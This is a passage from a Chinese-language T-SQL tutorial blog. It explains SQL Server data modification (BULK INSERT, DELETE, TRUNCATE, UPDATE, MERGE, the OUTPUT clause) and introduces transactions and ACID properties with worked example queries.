<p>&emsp;&emsp;⑤ <code>BULK INSERT</code>语句：用于将文件中的数据导入一个已经存在的表，需要制定目标表、源文件以及一些其他的选项。<br>&emsp;&emsp;下面的栗子演示了如何将文件 “C:\testdata\orders.txt” 中的数据容量插入（bulk insert）到 Orders 表，同时还指定了文件类型为字符格式，字段终止符为逗号，行终止符为换行符（\t）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BULK <span class="keyword">INSERT</span> dbo.Orders <span class="keyword">FROM</span> <span class="string">'C:\testdata\orders.txt'</span></span><br><span class="line">  <span class="keyword">WITH</span> </span><br><span class="line">    (</span><br><span class="line">       DATAFILETYPE    = <span class="string">'char'</span>,</span><br><span class="line">       FIELDTERMINATOR = <span class="string">','</span>,</span><br><span class="line">       ROWTERMINATOR   = <span class="string">'\n'</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<h3 id="看我花式删除数据"><a href="#看我花式删除数据" class="headerlink" title="看我花式删除数据"></a>看我花式删除数据</h3><p>&emsp;&emsp;① <code>DELETE</code>语句：标准 SQL 语句，大家最常见的用法。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> dbo.Orders</span><br><span class="line"><span class="keyword">WHERE</span> orderdate &lt; <span class="string">'20070101'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② <code>TRUNCATE</code>语句：不是标准的 SQL 语句，永于删除表中的所有行，不需要过滤条件。</p>
<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：<code>TRUNCATE</code>与<code>DELETE</code>在性能上差异巨大，对一个百万行级记录的表，<code>TRUNCATE</code>几秒内就可以解决，而<code>DELETE</code>可能需要几分钟。因为<code>TRUNCATE</code>会以最小模式记录日志，而<code>DELETE</code>则以完整模式记录日志。所以，各位，谨慎使用<code>TRUNCATE</code>。因此，我们可以创建一个虚拟表（Dummy Table），让虚拟表包含一个指向产品表的外键，这样就可以保护产品表了。</p>
</blockquote>
<p>&emsp;&emsp;③ 基于联接的<code>DELETE</code>：也不是标准 SQL 语句，可以根据另一个表中相关行的属性定义的过滤器来删除表中的数据行。<br>&emsp;&emsp;例如，下面语句用以删除美国客户下的订单：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> O</span><br><span class="line"><span class="keyword">FROM</span> dbo.Orders <span class="keyword">AS</span> O</span><br><span class="line">  <span class="keyword">JOIN</span> dbo.Customers <span class="keyword">AS</span> C</span><br><span class="line">    <span class="keyword">ON</span> O.custid = C.custid</span><br><span class="line"><span class="keyword">WHERE</span> C.country = N<span class="string">'USA'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当然，如果要使用标准 SQL 语句，也可以采用下面的方式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> dbo.Orders</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">  (<span class="keyword">SELECT</span> *</span><br><span class="line">   <span class="keyword">FROM</span> dbo.Customers <span class="keyword">AS</span> C</span><br><span class="line">   <span class="keyword">WHERE</span> Orders.custid = C.custid</span><br><span class="line">     <span class="keyword">AND</span> C.country = N<span class="string">'USA'</span>);</span><br></pre></td></tr></table></figure>

<h2 id="更新与合并数据"><a href="#更新与合并数据" class="headerlink" title="更新与合并数据"></a>更新与合并数据</h2><h3 id="花式更新数据"><a href="#花式更新数据" class="headerlink" title="花式更新数据"></a>花式更新数据</h3><p>&emsp;&emsp;① <code>UPDATE</code>语句：不解释了，大家都在用<br>&emsp;&emsp;下面来看两个不一样的栗子，第一个是关于同时操作的性质。看看下面的<code>UPDATE</code>语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> dbo.T1</span><br><span class="line">  <span class="keyword">SET</span> col1 = col1 + <span class="number">10</span>, col2 = col1 + <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;假设 T1 表中的 col1 列为 100，col2 列为 200。在计算后是多少呢？<br>&emsp;&emsp;答案揭晓：col=110, col=110。<br>&emsp;&emsp;再来看一个栗子，假设我们要实现两个数的交换该怎么做？我们可能迫不及待的说出临时变量。然而，在 SQL 中所有赋值表达式好像都是同时计算的，解决这个问题就不需要临时变量了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> dbo.T1</span><br><span class="line">  <span class="keyword">SET</span> col1 = col2, col2 = col1;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 基于联接的<code>UPDATE</code>语句：同样不是 SQL 标准语法，联接在此与基于联接的<code>DELETE</code>一样是起到过滤作用。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> OD</span><br><span class="line">  <span class="keyword">SET</span> discount = discount + <span class="number">0.05</span></span><br><span class="line"><span class="keyword">FROM</span> dbo.OrderDetails <span class="keyword">AS</span> OD</span><br><span class="line">  <span class="keyword">JOIN</span> dbo.Orders <span class="keyword">AS</span> O</span><br><span class="line">    <span class="keyword">ON</span> OD.orderid = O.orderid</span><br><span class="line"><span class="keyword">WHERE</span> custid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;同样，要使用标准 SQL 语法的话，可以用子查询替代联接：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> dbo.OrderDetails</span><br><span class="line">  <span class="keyword">SET</span> discount = discount + <span class="number">0.05</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">  (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dbo.Orders <span class="keyword">AS</span> O</span><br><span class="line">   <span class="keyword">WHERE</span> O.orderid = OrderDetails.orderid</span><br><span class="line">     <span class="keyword">AND</span> custid = <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;③ 赋值<code>UPDATE</code>：这是 T-SQL 特有的语法，可以对表中的数据进行更新的同时为变量赋值。你不需要使用单独的<code>UPDATE</code>和<code>SELECT</code>语句，就能完成同样的任务。<br>&emsp;&emsp;假设我们有一个表 Sequence，它只有一列 val，全是序号数字。我们可以通过赋值<code>UPDATE</code>得到一个新的序列值：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">nextval</span> <span class="keyword">AS</span> <span class="built_in">INT</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">Sequence</span> <span class="keyword">SET</span> @<span class="keyword">nextval</span> = val = val + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="keyword">nextval</span>;</span><br></pre></td></tr></table></figure>

<h3 id="新玩法：合并数据"><a href="#新玩法：合并数据" class="headerlink" title="新玩法：合并数据"></a>新玩法：合并数据</h3><p>&emsp;&emsp;SQL Server 2008 引入了一个叫做<code>MERGE</code>的语句，它能在一条语句中根据逻辑条件对数据进行不同的修改操作（<code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code>）。<code>MERGE</code>语句是 SQL 标准的一部分，而 T-SQL 版本的<code>MERGE</code>语句也增加了一些非标准的扩展。<br>&emsp;&emsp;下面我们看看如何合并，首先我们准备两张表 Customers 和 CustomersStage：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--merge data</span></span><br><span class="line"><span class="keyword">USE</span> tempdb;</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID('dbo.Customers', 'U') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.Customers;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dbo.Customers</span><br><span class="line">(</span><br><span class="line">  custid      <span class="built_in">INT</span>         <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  companyname <span class="built_in">VARCHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  phone       <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  address     <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> PK_Customers PRIMARY <span class="keyword">KEY</span>(custid)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Customers(custid, companyname, phone, address)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="number">1</span>, <span class="string">'cust 1'</span>, <span class="string">'(111) 111-1111'</span>, <span class="string">'address 1'</span>),</span><br><span class="line">  (<span class="number">2</span>, <span class="string">'cust 2'</span>, <span class="string">'(222) 222-2222'</span>, <span class="string">'address 2'</span>),</span><br><span class="line">  (<span class="number">3</span>, <span class="string">'cust 3'</span>, <span class="string">'(333) 333-3333'</span>, <span class="string">'address 3'</span>),</span><br><span class="line">  (<span class="number">4</span>, <span class="string">'cust 4'</span>, <span class="string">'(444) 444-4444'</span>, <span class="string">'address 4'</span>),</span><br><span class="line">  (<span class="number">5</span>, <span class="string">'cust 5'</span>, <span class="string">'(555) 555-5555'</span>, <span class="string">'address 5'</span>);</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID('dbo.CustomersStage', 'U') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.CustomersStage;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dbo.CustomersStage</span><br><span class="line">(</span><br><span class="line">  custid      <span class="built_in">INT</span>         <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  companyname <span class="built_in">VARCHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  phone       <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  address     <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> PK_CustomersStage PRIMARY <span class="keyword">KEY</span>(custid)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.CustomersStage(custid, companyname, phone, address)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="number">2</span>, <span class="string">'AAAAA'</span>, <span class="string">'(222) 222-2222'</span>, <span class="string">'address 2'</span>),</span><br><span class="line">  (<span class="number">3</span>, <span class="string">'cust 3'</span>, <span class="string">'(333) 333-3333'</span>, <span class="string">'address 3'</span>),</span><br><span class="line">  (<span class="number">5</span>, <span class="string">'BBBBB'</span>, <span class="string">'CCCCC'</span>, <span class="string">'DDDDD'</span>),</span><br><span class="line">  (<span class="number">6</span>, <span class="string">'cust 6 (new)'</span>, <span class="string">'(666) 666-6666'</span>, <span class="string">'address 6'</span>),</span><br><span class="line">  (<span class="number">7</span>, <span class="string">'cust 7 (new)'</span>, <span class="string">'(777) 777-7777'</span>, <span class="string">'address 7'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Query tables</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dbo.Customers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dbo.CustomersStage;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="28.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;现在我们想要增加还不存在的客户，并更新已经存在的客户。源表：CustomersStage，目标表：Customers。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MERGE</span> <span class="keyword">INTO</span> dbo.Customers <span class="keyword">AS</span> TGT</span><br><span class="line"><span class="keyword">USING</span> dbo.CustomersStage <span class="keyword">AS</span> SRC</span><br><span class="line">  <span class="keyword">ON</span> TGT.custid = SRC.custid</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">MATCHED</span> <span class="keyword">THEN</span></span><br><span class="line">  <span class="keyword">UPDATE</span> <span class="keyword">SET</span></span><br><span class="line">    TGT.companyname = SRC.companyname,</span><br><span class="line">    TGT.phone = SRC.phone,</span><br><span class="line">    TGT.address = SRC.address</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">NOT</span> <span class="keyword">MATCHED</span> <span class="keyword">THEN</span> </span><br><span class="line">  <span class="keyword">INSERT</span> (custid, companyname, phone, address)</span><br><span class="line">  <span class="keyword">VALUES</span> (SRC.custid, SRC.companyname, SRC.phone, SRC.address);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;谓词条件：<code>TGT.custid=SRC.custid</code>用于定义什么样的数据是匹配的，什么样的数据是不匹配的。</p>
<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：<strong><code>MERGE</code>语句必须以分号结束</strong>，而对于 T-SQL 中的大多数其他语句来说是可选的。但是，推荐遵循最佳实践，以分号结束。</p>
</blockquote>
<h2 id="高级数据更新方法"><a href="#高级数据更新方法" class="headerlink" title="高级数据更新方法"></a>高级数据更新方法</h2><p>&emsp;&emsp;① 通过表表达式修改数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于联接的UPDATE</span></span><br><span class="line"><span class="keyword">UPDATE</span> OD</span><br><span class="line">  <span class="keyword">SET</span> discount = discount + <span class="number">0.05</span></span><br><span class="line"><span class="keyword">FROM</span> dbo.OrderDetails <span class="keyword">AS</span> OD</span><br><span class="line">  <span class="keyword">JOIN</span> dbo.Orders <span class="keyword">AS</span> O</span><br><span class="line">    <span class="keyword">ON</span> OD.orderid = O.orderid</span><br><span class="line"><span class="keyword">WHERE</span> custid = <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- 基于表表达式（这里是CTE）的UPDATE</span></span><br><span class="line"><span class="keyword">WITH</span> C <span class="keyword">AS</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">SELECT</span> custid, OD.orderid,</span><br><span class="line">    productid, discount, discount + <span class="number">0.05</span> <span class="keyword">AS</span> newdiscount</span><br><span class="line">  <span class="keyword">FROM</span> dbo.OrderDetails <span class="keyword">AS</span> OD</span><br><span class="line">    <span class="keyword">JOIN</span> dbo.Orders <span class="keyword">AS</span> O</span><br><span class="line">      <span class="keyword">ON</span> OD.orderid = O.orderid</span><br><span class="line">  <span class="keyword">WHERE</span> custid = <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">UPDATE</span> C</span><br><span class="line">  <span class="keyword">SET</span> discount = newdiscount;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 带有<code>TOP</code>选项的数据更新</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除前50行</span></span><br><span class="line"><span class="keyword">DELETE</span> TOP(<span class="number">50</span>) <span class="keyword">FROM</span> dbo.Orders;</span><br><span class="line"><span class="comment">-- 更新前50行</span></span><br><span class="line"><span class="keyword">UPDATE</span> TOP(<span class="number">50</span>) dbo.Orders</span><br><span class="line">  <span class="keyword">SET</span> freight = freight + <span class="number">10.00</span>;</span><br><span class="line"><span class="comment">-- 基于CTE删除前50行</span></span><br><span class="line"><span class="keyword">WITH</span> C <span class="keyword">AS</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">SELECT</span> TOP(<span class="number">50</span>) *</span><br><span class="line">  <span class="keyword">FROM</span> dbo.Orders</span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> orderid</span><br><span class="line">)</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> C;</span><br><span class="line"><span class="comment">-- 基于CTE更新前50行</span></span><br><span class="line"><span class="keyword">WITH</span> C <span class="keyword">AS</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">SELECT</span> TOP(<span class="number">50</span>) *</span><br><span class="line">  <span class="keyword">FROM</span> dbo.Orders</span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> orderid <span class="keyword">DESC</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">UPDATE</span> C</span><br><span class="line">  <span class="keyword">SET</span> freight = freight + <span class="number">10.00</span>;</span><br></pre></td></tr></table></figure>

<h2 id="OUTPUT-子句"><a href="#OUTPUT-子句" class="headerlink" title="OUTPUT 子句"></a>OUTPUT 子句</h2><p>&emsp;&emsp;在某些场景中，我们希望能够从修改过的行中返回数据，这时就可以使用<code>OUTPUT</code>子句。SQL Server 2005 引入了<code>OUTPUT</code>子句，通过在修改语句中添加<code>OUTPUT</code>子句，就可以实现从修改语句中返回数据的功能。<br>&emsp;&emsp;① 带有<code>OUTPUT</code>的<code>INSERT</code>语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.T1(datacol)</span><br><span class="line">  <span class="keyword">OUTPUT</span> inserted.keycol, inserted.datacol</span><br><span class="line">    <span class="keyword">SELECT</span> lastname</span><br><span class="line">    <span class="keyword">FROM</span> TSQLFundamentals2008.HR.Employees</span><br><span class="line">    <span class="keyword">WHERE</span> country = N<span class="string">'USA'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 带有<code>OUTPUT</code>的<code>DELETE</code>语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> dbo.Orders</span><br><span class="line">  <span class="keyword">OUTPUT</span></span><br><span class="line">    deleted.orderid,</span><br><span class="line">    deleted.orderdate,</span><br><span class="line">    deleted.empid,</span><br><span class="line">    deleted.custid</span><br><span class="line"><span class="keyword">WHERE</span> orderdate &lt; <span class="string">'20080101'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;③ 带有<code>OUTPUT</code>的<code>UPDATE</code>语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> dbo.OrderDetails</span><br><span class="line">  <span class="keyword">SET</span> discount = discount + <span class="number">0.05</span></span><br><span class="line"><span class="keyword">OUTPUT</span></span><br><span class="line">  inserted.productid,</span><br><span class="line">  deleted.discount <span class="keyword">AS</span> olddiscount,</span><br><span class="line">  inserted.discount <span class="keyword">AS</span> newdiscount</span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">51</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;④ 带有<code>OUTPUT</code>的<code>MERGE</code>语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MERGE</span> <span class="keyword">INTO</span> dbo.Customers <span class="keyword">AS</span> TGT</span><br><span class="line"><span class="keyword">USING</span> dbo.CustomersStage <span class="keyword">AS</span> SRC</span><br><span class="line">  <span class="keyword">ON</span> TGT.custid = SRC.custid</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">MATCHED</span> <span class="keyword">THEN</span></span><br><span class="line">  <span class="keyword">UPDATE</span> <span class="keyword">SET</span></span><br><span class="line">    TGT.companyname = SRC.companyname,</span><br><span class="line">    TGT.phone = SRC.phone,</span><br><span class="line">    TGT.address = SRC.address</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">NOT</span> <span class="keyword">MATCHED</span> <span class="keyword">THEN</span> </span><br><span class="line">  <span class="keyword">INSERT</span> (custid, companyname, phone, address)</span><br><span class="line">  <span class="keyword">VALUES</span> (SRC.custid, SRC.companyname, SRC.phone, SRC.address)</span><br><span class="line"><span class="keyword">OUTPUT</span> $<span class="keyword">action</span>, inserted.custid,</span><br><span class="line">  deleted.companyname <span class="keyword">AS</span> oldcompanyname,</span><br><span class="line">  inserted.companyname <span class="keyword">AS</span> newcompanyname,</span><br><span class="line">  deleted.phone <span class="keyword">AS</span> oldphone,</span><br><span class="line">  inserted.phone <span class="keyword">AS</span> newphone,</span><br><span class="line">  deleted.address <span class="keyword">AS</span> oldaddress,</span><br><span class="line">  inserted.address <span class="keyword">AS</span> newaddress;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;以上<code>MERGE</code>语句使用<code>OUTPUT</code>子句返回被修改过的行的新旧版本的值。对于<code>INSERT</code>操作不存在旧版本的值，因此所有 deleted 列的值都返回 <em>NULL</em> 。<code>$action</code>函数会告诉我们输出行是<code>UPDATE</code>还是由<code>INSERT</code>操作生成的。</p>
<figure class="image-box">
                <img src="29.png" alt title class>
                <p></p>
            </figure>

<hr>
<h1 id="事务和并发"><a href="#事务和并发" class="headerlink" title="事务和并发"></a>事务和并发</h1><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="事务的概念"><a href="#事务的概念" class="headerlink" title="事务的概念"></a>事务的概念</h3><p>&emsp;&emsp;事务是作为单个工作单元而执行的一系列操作，比如查询和修改数据等。<br>&emsp;&emsp;事务是数据库并发控制的基本单位，一条或者一组语句要么全部成功，对数据库中的某些数据成功修改；要么全部不成功，数据库中的数据还原到这些语句执行之前的样子。</p>
<blockquote>
<p>&emsp;&emsp;比如网上订火车票，要么你定票成功，余票显示就减一张；要么你定票失败获取取消订票，余票的数量还是那么多。不允许出现你订票成功了，余票没有减少或者你取消订票了，余票显示却少了一张的这种情况。这种不被允许出现的情况就要求购票和余票减少这两个不同的操作必须放在一起，成为一个完整的逻辑链，这样就构成了一个事务。</p>
</blockquote>
<h3 id="事务的-ACID-特性"><a href="#事务的-ACID-特性" class="headerlink" title="事务的 ACID 特性"></a>事务的 ACID 特性</h3><ul>
<li><strong>原子性（Atomicity）</strong>：<br>&emsp;&emsp;事务的原子性是指一个事务中包含的一条语句或者多条语句构成了一个完整的逻辑单元，这个逻辑单元具有不可再分的原子性。这个逻辑单元要么一起提交执行全部成功，要么一起提交执行全部失败。  </li>
<li><strong>一致性（Consistency）</strong>：<br>&emsp;&emsp;可以理解为数据的完整性，事务的提交要确保在数据库上的操作没有破坏数据的完整性，比如说不要违背一些约束的数据插入或者修改行为。一旦破坏了数据的完整性，SQL Server 会回滚这个事务来确保数据库中的数据是一致的。  </li>
<li><strong>隔离性（Isolation）</strong>：<br>&emsp;&emsp;与数据库中的事务隔离级别以及锁相关，多个用户可以对同一数据并发访问而又不破坏数据的正确性和完整性。但是，并行事务的修改必须与其它并行事务的修改相互独立，隔离。 但是在不同的隔离级别下，事务的读取操作可能得到的结果是不同的。  </li>
<li><strong>持久性（Durability）</strong>：<br>&emsp;&emsp;数据持久化，事务一旦对数据的操作完成并提交后，数据修改就已经完成，即使服务重启这些数据也不会改变。相反，如果在事务的执行过程中，系统服务崩溃或者重启，那么事务所有的操作就会被回滚，即回到事务操作之前的状态。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;在极端断电或者系统崩溃的情况下，一个发生在事务未提交之前，数据库应该记录了这个事务的 “ID” 和部分已经在数据库上更新的数据。供电恢复数据库重新启动之后，这时完成全部撤销和回滚操作。如果在事务提交之后的断电，有可能更改的结果没有正常写入磁盘持久化，但是有可能丢失的数据会通过事务日志自动恢复并重新生成以写入磁盘完成持久化。</p>
</blockquote>
<h3 id="如何定义事务"><a href="#如何定义事务" class="headerlink" title="如何定义事务"></a>如何定义事务</h3><p>（1）显示定义：以<code>BEGIN TRAN</code>开始，提交的话则<code>COMMIT</code>提交事务，否则以<code>ROLLBACK</code>回滚事务。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--定义事务</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.T1(keycol, col1, col2) <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="number">101</span>,<span class="string">'C'</span>);</span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.T1(keycol, col1, col2) <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="number">201</span>,<span class="string">'X'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>（2）隐式定义：SQL Server 中默认把每个单独的语句作为一个事务。<br>&emsp;&emsp;换句话说，SQL Server 默认在执行完每个语句之后就自动提交事务。当然，我们可以通过<code>IMPLICIT_TRANSACTIONS</code>会话选项来改变 SQL Server 处理默认事务的方式，该选项默认情况下是 <em>OFF</em> 。如果将其设置为 <em>ON</em> ，那么就不必用<code>BEGIN TRAN</code>语句来表明事务开始，但仍然需要以<code>COMMIT</code>或<code>ROLLBACK</code>来标明事务完成。</p>
